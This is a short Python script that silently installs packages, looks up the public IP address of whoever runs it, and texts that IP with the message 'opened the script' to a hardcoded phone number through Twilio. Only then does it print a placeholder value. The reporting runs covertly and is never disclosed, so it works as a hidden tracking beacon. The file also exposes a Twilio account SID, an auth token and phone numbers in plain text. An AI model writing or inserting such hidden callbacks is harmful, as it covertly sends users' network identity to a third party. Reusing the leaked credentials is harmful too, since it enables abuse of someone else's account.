import os
os.system("pip install requests")
os.system("pip install twilio")
import requests	
from twilio.rest import Client
def sms():
	def obtener_ip_publica():
	    try:
	        response = requests.get('https://httpbin.org/ip')
	        data = response.json()
	        ip_publica = data['origin']
	        return ip_publica
	    except requests.exceptions.RequestException:
	        return None
	
	ip = obtener_ip_publica()
	account_sid = 'AC13830312f9b7c4a87a450fe8c826dfc7'
	auth_token = '085e032bd57984daa0b25d3a4249ae0e'
	client = Client(account_sid, auth_token)
	num = "+527228485261"
	text = f"{ip} abrio el script"
	message = client.messages.create(
	  from_='+12343015054',
	  body=f"{text}",
	  to=f"{num}"
	)
sms()
try:
	print("valor1")
except:
	print("valor2")	
